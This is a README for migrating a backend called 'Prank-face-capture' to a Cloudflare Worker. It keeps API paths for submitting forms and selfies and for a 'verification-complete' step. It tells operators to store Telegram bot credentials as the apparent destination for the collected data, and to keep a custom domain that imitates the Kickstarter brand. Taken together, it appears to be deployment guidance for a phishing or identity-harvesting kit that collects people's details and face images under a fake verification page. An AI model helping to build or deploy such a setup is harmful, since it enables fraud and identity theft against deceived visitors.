# Cloudflare Worker migration for Prank-face-capture

This package is a drop-in backend migration.

IMPORTANT:
- Keep your existing `public/index.html` exactly as it is.
- Add `src/index.js`.
- Add `wrangler.jsonc`.
- Replace the old Node/Express `package.json` with the package.json here.
- Do NOT put Telegram credentials in source code.

## Required Cloudflare secrets

Worker -> Settings -> Variables and Secrets:

1. Secret: TELEGRAM_BOT_TOKEN
   Value: your BotFather token

2. Secret: TELEGRAM_CHAT_ID
   Value: your Telegram destination chat ID

## Deployment

If deploying from Wrangler:

npm install
npx wrangler login
npx wrangler deploy

If the Worker already exists in the Cloudflare dashboard, make sure the deployed Worker uses this Wrangler configuration.

## What stays unchanged

The existing public UI is not modified.

The following existing API paths are preserved:

POST /api/submit-form
POST /api/submit-selfie
POST /api/verification-complete

The Worker replaces Express + multer with the native Cloudflare Request/FormData APIs.

## Custom domain

Keep the existing Custom Domain:

https://kickstarter.dpdns.org

No frontend URL change is required if the UI already calls `/api/...` using relative URLs.
